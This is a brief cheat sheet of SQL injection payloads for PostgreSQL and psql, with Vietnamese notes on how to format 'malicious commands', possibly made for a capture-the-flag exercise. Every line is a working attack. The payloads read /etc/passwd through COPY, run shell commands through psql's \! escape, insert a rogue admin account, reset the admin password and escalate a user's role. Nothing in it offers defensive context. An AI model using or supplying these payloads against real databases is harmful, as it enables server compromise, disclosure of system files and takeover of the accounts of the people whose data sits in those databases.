¿'; CREATE TEMP TABLE out(content text); COPY out FROM '/etc/passwd'; SELECT content FROM out; --
¿'; \! id ; #
¿'; \! cat /etc/passwd; #

*** FORMAT lệnh: ***
- postgresql : ¿'; + các lệnh độc --
- psql : ¿'; \! các lệnh độc #

¿'; INSERT INTO users (username, password, role, email) VALUES ('hacker12', 'pwned', 'admin', 'hacker12@fcode.org'); --
¿'; UPDATE users SET password = '123' WHERE username = 'admin'; --
¿'; UPDATE users SET role = 'admin' WHERE username = 'hacker12'; --